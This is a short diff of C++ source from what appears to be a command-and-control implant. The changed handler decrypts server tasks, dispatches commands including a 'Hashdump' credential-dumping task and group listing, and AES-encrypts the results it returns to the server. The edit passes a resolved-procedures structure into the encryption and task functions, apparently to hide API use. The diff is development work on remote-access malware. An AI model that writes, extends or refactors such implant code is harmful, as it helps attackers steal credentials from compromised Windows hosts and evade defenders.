@@ -143,6 +143,7 @@ namespace Handler
 
         // We need to decrypt and encrypt to send back the task value for server-side decryption correctly.
         std::vector<BYTE> taskDec = Crypt::Decrypt(
+            pState->pProcs,
             wTaskEnc,
             pState->pCrypt->pAES->hKey,
             pState->pCrypt->pAES->iv
@@ -153,6 +154,7 @@ namespace Handler
         }
 
         pState->wTask = Crypt::Encrypt(
+            pState->pProcs,
             taskDec,
             pState->pCrypt->pAES->hKey,
             pState->pCrypt->pAES->iv
@@ -225,7 +227,7 @@ namespace Handler
                 );
                 break;
             case TASK_GROUP_LS:
-                wTaskResult = Task::GroupLs();
+                wTaskResult = Task::GroupLs(pState);
                 break;
             case TASK_HASHDUMP:
                 wTaskResult = Task::Hashdump(pState);
@@ -407,6 +409,7 @@ namespace Handler
         // Encrypt task result
         std::string sTaskResultJSON = pState->taskResultJSON.dump();
         std::wstring wEnc = Crypt::Encrypt(
+            pState->pProcs,
             std::vector<BYTE>(sTaskResultJSON.begin(), sTaskResultJSON.end()),
             pState->pCrypt->pAES->hKey,
             pState->pCrypt->pAES->iv
